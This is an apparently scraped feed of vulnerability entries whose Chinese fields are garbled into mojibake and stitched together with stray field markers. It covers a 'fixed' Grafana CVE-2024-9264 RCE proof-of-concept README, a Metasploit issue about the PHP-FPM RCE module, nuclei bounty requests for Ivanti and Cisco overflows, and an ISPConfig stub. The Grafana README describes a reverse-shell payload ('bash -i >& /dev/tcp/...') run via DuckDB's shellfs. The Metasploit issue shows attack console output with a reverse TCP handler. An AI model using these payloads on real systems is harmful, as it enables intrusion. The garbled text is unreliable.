æ¼æ´æè¿°ï¼š CVE-2024-9264æ˜¯Grafanaä¸­çš„ä¸€ä¸ªä¸¥é‡è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œé€šè¿‡SQLè¡¨è¾¾å¼å’ŒDuckDBåˆ©ç”¨ã€‚æ­¤æ¼æ´å…è®¸æ”»å‡»è€…åœ¨æ˜“å—æ”»å‡»çš„Grafanaå®ä¾‹ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚ä¿®å¤ç‰ˆæœ¬è§£å†³äº†åŸå§‹PoCä¸­çš„è¯­æ³•é”™è¯¯å’Œwrite_file()å‡½æ•°çš„ä¸æ­£ç¡®ä½¿ç”¨é—®é¢˜ï¼Œå¹¶æˆåŠŸé€šè¿‡shellfsæ‰©å±•å†™å…¥å’Œæ‰§è¡Œåå‘shellã€‚

äº§å“å‚å•†ï¼š Grafana

äº§å“åç§°ï¼š Grafana

å½±å“ç‰ˆæœ¬ï¼š 11.0.0

æ¥æºï¼š https://github.com/Exerrdev/CVE-2024-9264-Fixed

ç±»å‹ï¼š CVE-2024:github search

ä»“åº“æ–‡ä»¶

  • README.md
  • fpoc.py

æ¥æºæ¦‚è¿°

ğŸ› ï¸ CVE-2024-9264 - Fixed Grafana RCE Exploit

This is a fixed version of the proof-of-concept exploit for CVE-2024-9264, a critical remote code execution vulnerability in Grafana (via SQL expressions and DuckDB).

ğŸ”— Original advisory: Grafana Security Release
âŒ Original PoC: Broken due to syntax errors and incorrect use of write_file()
âœ… This version works, tested on a vulnerable Grafana 11.0.0 instance.

âœ… Fixes in this version

  • âœ… Correctly uses writefile() instead of write_file() (DuckDB function)
  • âœ… Proper shell payload using bash -i >& /dev/tcp/...
  • âœ… Reverse shell written and executed successfully via shellfs extension

ğŸ“¦ Requirements

  • Grafana instance with:
    • DuckDB backend
    • Ability to install shellfs from community
  • A netcat listener on your attacker machine

ğŸš€ Usage

Then listen with:

âš ï¸ Legal Disclaimer

This project is for educational purposes only.
Do not use it against targets you do not have permission to test.

âœï¸ Author of this Fix

Modified and validated by Exerr â€” original PoC by z3k0sec.

entry.title: PHP FPM è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´
entry.content:
æ¼æ´ä¿¡æ¯

æ¼æ´åç§°ï¼š PHP FPM è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´

æ¼æ´ç±»å‹ï¼š å‘½ä»¤æ‰§è¡Œ

æ¼æ´ç­‰çº§ï¼š é«˜å±

æ¼æ´æè¿°ï¼š è¯¥æ¼æ´å­˜åœ¨äºPHP FPMä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹å®šçš„è¯·æ±‚ï¼Œåˆ©ç”¨Metasploitæ¡†æ¶ä¸­çš„exploit/multi/http/php_fpm_rceæ¨¡å—å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ç”±äºæ–°çš„PHPç¼–ç å™¨â€HEXâ€å¯¼è‡´payloadå¤§å°è¶…å‡ºé™åˆ¶ï¼Œä½¿å¾—è¯¥æ¼æ´åœ¨å½“å‰Metasploitç‰ˆæœ¬ä¸­ä¸å†æœ‰æ•ˆã€‚

äº§å“å‚å•†ï¼š PHP

äº§å“åç§°ï¼š PHP FPM

å½±å“ç‰ˆæœ¬ï¼š 7.2.19

æ¥æºï¼š https://github.com/rapid7/metasploit-framework/issues/20310

ç±»å‹ï¼š rapid7/metasploit-framework:github issues

æ¥æºæ¦‚è¿°

Steps to reproduce

Howâ€™d you do it?

  1. Victim: PHP 7.2.19, on Nginx 1.14.2 with FPM
  2. Attacker: Metasploit Framework v6.4.45-dev, using module exploit/multi/http/php_fpm_rce

-> Exploit worked reliable on older Metasploit versions

Expected behavior

Default settings, default target (PHP), default payload (meterpreter/reverse_tcp)
During check phase, the max payload length is determined being 1760 bytes
Payload gets sent and a meterpreter shell is opened

Current behavior

During check phase, max payload length is determined being 1760 bytes
Then payload is prepared and encoded via the new default PHP encoder â€œHEXâ€, which is larger (2270 bytes), making the exploit fail

Metasploit version

v6.4.45-dev

Additional Information

Output:

msf6 exploit(multi/http/php_fpm_rce) > run
[*] Started reverse TCP handler on 10.11.14.240:4444
[*] Sending baseline queryâ€¦
[*] Detecting QSLâ€¦
[+] The target is probably vulnerable. Possible QSLs: [1765]
[*] Doing sanity checkâ€¦
[*] Detecting attack parametersâ€¦
[+] Parameters found: QSL=1760, customh_length=31
[+] Target is vulnerable!
[*] Performing attack using php.ini settingsâ€¦
[+] Success! Was able to execute a command by appending â€˜which whichâ€™
[*] Trying to cleanup /tmp/yâ€¦
[+] Cleanup done!
[*] Sending payloadâ€¦
[-] Exploit aborted due to failure: unknown: QSL value too small to fit the command: QSL=1760, qsl_delta=0, prefix (size=2270)=W=php%20-r%20%22eval(hex2bin(%%22));%22%26
[*] Exploit completed, but no session was created.

entry.title: Ivanti Buffer Overflow Vulnerability
entry.content:
æ¼æ´ä¿¡æ¯

æ¼æ´åç§°ï¼š Ivanti Buffer Overflow Vulnerability

æ¼æ´ç¼–å·ï¼š

  • CVEï¼š CVE-2025-0282

æ¼æ´ç±»å‹ï¼š ç¼“å†²åŒºæº¢å‡º

æ¼æ´ç­‰çº§ï¼š ä¸¥é‡

æ¼æ´æè¿°ï¼š Ivanti Connect Secure < 22.7R2.5, Ivanti Policy Secure < 22.7R1.2, ä»¥åŠ Ivanti Neurons for ZTA gateways < 22.7R2.3 å­˜åœ¨ä¸€ä¸ªç”±äºä¸å½“è¾“å…¥å¤„ç†å¯¼è‡´çš„æ ˆåŸºç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œå…è®¸è¿œç¨‹æœªè®¤è¯æ”»å‡»è€…é€šè¿‡å‘é€ç‰¹åˆ¶è¯·æ±‚æ‰§è¡Œä»»æ„ä»£ç ã€‚

äº§å“å‚å•†ï¼š Ivanti

äº§å“åç§°ï¼š Ivanti Connect Secure, Ivanti Policy Secure, Ivanti Neurons for ZTA gateways

å½±å“ç‰ˆæœ¬ï¼š Ivanti Connect Secure < 22.7R2.5, Ivanti Policy Secure < 22.7R1.2, Ivanti Neurons for ZTA gateways < 22.7R2.3

æœç´¢è¯­æ³•ï¼š http.title:â€ivanti connect secureâ€

æ¥æºï¼š https://github.com/projectdiscovery/nuclei-templates/issues/12130

ç±»å‹ï¼š projectdiscovery/nuclei-templates:github issues

æ¥æºæ¦‚è¿°

Description:

Ivanti Connect Secure < 22.7R2.5, Ivanti Policy Secure < 22.7R1.2, and Ivanti Neurons for ZTA gateways < 22.7R2.3 contain a stack-based buffer overflow caused by improper input handling, letting remote unauthenticated attackers execute arbitrary code, exploit requires sending crafted requests.

Severity: Critical
POC:

Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. entry.title: Cisco IOS Smart Install Buffer Overflow Vulnerability
entry.content:
æ¼æ´ä¿¡æ¯

æ¼æ´åç§°ï¼š Cisco IOS Smart Install Buffer Overflow Vulnerability

æ¼æ´ç¼–å·ï¼š

  • CVEï¼š CVE-2018-0171

æ¼æ´ç±»å‹ï¼š ç¼“å†²åŒºæº¢å‡º

æ¼æ´ç­‰çº§ï¼š ä¸¥é‡

æ¼æ´æè¿°ï¼š Cisco IOSå’ŒIOS XEè½¯ä»¶ä¸­çš„Smart InstallåŠŸèƒ½å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œç”±äºå¯¹Smart Installæ•°æ®åŒ…æ•°æ®çš„ä¸å½“éªŒè¯ï¼Œæœªç»è®¤è¯çš„è¿œç¨‹æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ç‰¹åˆ¶çš„Smart Installæ¶ˆæ¯ï¼ˆTCPç«¯å£4786ï¼‰è§¦å‘è®¾å¤‡é‡å¯ã€æ‰§è¡Œä»»æ„ä»£ç æˆ–å¯¼è‡´æ— é™å¾ªç¯ã€‚

äº§å“å‚å•†ï¼š Cisco

äº§å“åç§°ï¼š Cisco IOS and IOS XE Software

æœç´¢è¯­æ³•ï¼š cpe:â€cpe:2.3:o:cisco:iosâ€

æ¥æºï¼š https://github.com/projectdiscovery/nuclei-templates/issues/12325

ç±»å‹ï¼š projectdiscovery/nuclei-templates:github issues

æ¥æºæ¦‚è¿°

Description:

Cisco IOS and IOS XE Software contain a buffer overflow caused by improper validation of Smart Install packet data, letting unauthenticated remote attackers trigger device reload, execute arbitrary code, or cause indefinite loops, exploit requires sending crafted Smart Install message on TCP port 4786.

Severity: Critical
POC:
  • https://vulncheck.com/xdb/6d4b443f23fc
  • https://github.com/AlrikRr/Cisco-Smart-Exploit
  • https///github.com:AlrikRr/Cisco-Smart-Exploit.git

KEV: True

Shodan Query: cpe:"cpe:2.3:o:cisco:ios"

Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(-debug) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file.

Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and wonâ€™t produce results, so we prioritize creating templates with other protocols unless exceptions are made.

You can check the FAQ for the Nuclei Templates Community Rewards Program here.

æ¥æºæ¦‚è¿°

CVE-2023-46818

An issue was discovered in ISPConfig before 3.2.11p1. PHP code injection can be achieved in the language file editor by an admin if admin_allow_langedit is enabled.

Usage

References

  • https://nvd.nist.gov/vuln/detail/CVE-2023-46818
  • https://www.ispconfig.org/blog/ispconfig-3-2-11p1-released
  • https://seclists.org/fulldisclosure/2023/Dec/2

Credit

If you found this project useful or interesting, consider supporting it by giving a â­ to the repository!
